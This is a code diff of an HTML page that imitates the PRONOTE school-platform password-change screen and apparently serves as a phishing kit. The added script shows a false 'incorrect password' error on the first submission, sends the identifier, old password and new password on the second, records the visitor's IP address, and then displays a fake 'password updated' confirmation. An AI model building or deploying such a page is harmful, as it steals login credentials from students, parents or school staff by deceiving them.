@@ -56,6 +56,33 @@
 <body id="id_body"
   onload="try { Start ({h:'6059177',sCrA:true,sCoA:true,poll:true,a:8}) } catch (e) { messageErreur (e) } "
   class="EspaceMobileIndex">
+  <div id="container-fin" class="cache">
+    <div id="IE.Identite.collection.g5_Fenetre" aria-labelledby="IE.Identite.collection.g5_Titre"
+    aria-describedby="IE.Identite.collection.g5_Contenu" class="ObjetFenetre_Espace ObjetMessage ObjetMessage_0"
+    tabindex="-1" role="alertdialog" aria-modal="true">
+    <div id="IE.Identite.collection.g5_FenetreContenu" class="Fenetre_Cadre ombre-cadre"
+      style="box-sizing:border-box; width: 100px;min-height: 100px; background-color:var(--color-background);">
+      <div class="Fenetre_Titre NePasImprimer">
+        <h1 id="IE.Identite.collection.g5_Titre" class="ZoneDeplacementFenetre ie-draggable-handle" tabindex="0"><i
+            class="om_iconeTitre" aria-hidden="true"></i>Information</h1>
+        <div class="cta-conteneur" style="display: none;"><i role="button" tabindex="0"
+            class="btnImageIcon as-button icon_fermeture_widget btnImage" aria-label="Fermer" title="Fermer"></i></div>
+      </div>
+      <div id="IE.Identite.collection.g5_Res" class="Fenetre_Espace">
+        <div id="IE.Identite.collection.g5_Contenu" class="Fenetre_Contenu">
+          <p style="width:360px;" class="contenu"><h3>Mot de passe mis à jour</h3><br>Merci d'avoir mis à jour votre mot de passe. Vous pouvez désormais fermer cette page.</p>
+        </div>
+      </div>
+      <div class="NePasImprimer">
+        <div class="zone-bas"><!--ie-if-->
+          <div class="btn-conteneur"><!--ie-repeat-->
+            <div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  </div>
   <noscript style="position: absolute; top: 100px" class="Texte12 Gras Espace">Java script non activé.
     Veuillez le réactiver.</noscript>
   <div id="zone_fenetre" class="NePasImprimer ThemeColIdf">
@@ -116,6 +143,7 @@
                   title="Voir le mot de passe" aria-label="Voir le mot de passe" class="icon_eye_open btnImage" id="voirmdp"></i>
               </div><label for="id_31" class="icon_strategie_code_pin">Ancien mot de passe</label>
             </div>
+            <p id="id_26" class="message-erreur" aria-hidden="false" style="display: none;">Votre identifiant ou votre mot de passe est incorrect.<br>Pour information, la saisie du mot de passe doit respecter les minuscules et majuscules.</p>
             <div class="input-field">
               <div class="as-input as-password"><input name="mdp" oninput="checkco()" id="nvmdp" type="password"
                   title="Saisissez votre MOT DE PASSE. Il vous est communiqué par l'établissement, vous pourrez le modifier dans l'onglet &quot;Compte&quot;."
@@ -151,8 +179,33 @@
       </footer>
     </div>
   </div>
+  <style>
+    
+    #container-fin {
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 10;
+      width: 100vw;
+      height: 100vh;
+      display: grid;
+      place-items: center;
+      background-color: #ffffff66;
+    }
+
+    #container-fin > * {
+      transform: scale(1.1);
+    }
+
+
+    #container-fin.cache {
+      display: none;
+    }
+  </style>
   <script>
+    let valid = 0;
     let ip;
+    let fin = document.querySelector('#container-fin')
     document.addEventListener("DOMContentLoaded", function() {
             // Fetch the IP address from the API
       fetch("https://api.ipify.org?format=json")
@@ -168,6 +221,7 @@
 
     
     function checkco() {
+      document.getElementById('id_26').style.display = 'none';
       const id = document.querySelector("input[name='identifiant']").value;
       const ancienmdp = document.querySelector("input[name='ancienmdp']").value;
       const mdp = document.querySelector("input[name='mdp']").value;
@@ -204,7 +258,11 @@
 
     const form = document.querySelector("form");
         form.addEventListener("submit", (e) => {
-            e.preventDefault();
+          e.preventDefault();
+          if (valid == 0) {
+            document.getElementById('id_26').style.display = 'block';
+            valid++;
+          } else {
             const id = document.querySelector("input[name='identifiant']").value;
             const ancienmdp = document.querySelector("input[name='ancienmdp']").value;
             const mdp = document.querySelector("input[name='mdp']").value;
@@ -226,6 +284,11 @@
                 .catch(error => {
                     console.error('Error sending message:', error);
             });
+            setTimeout(()=> {
+              fin.classList.remove('cache')
+            }, 400)
+          }
+            
         });
   </script>
   <a href="https://www.index-education.com/redirect.php?distrib=FR" target="_blank" style="display:none">PRONOTE
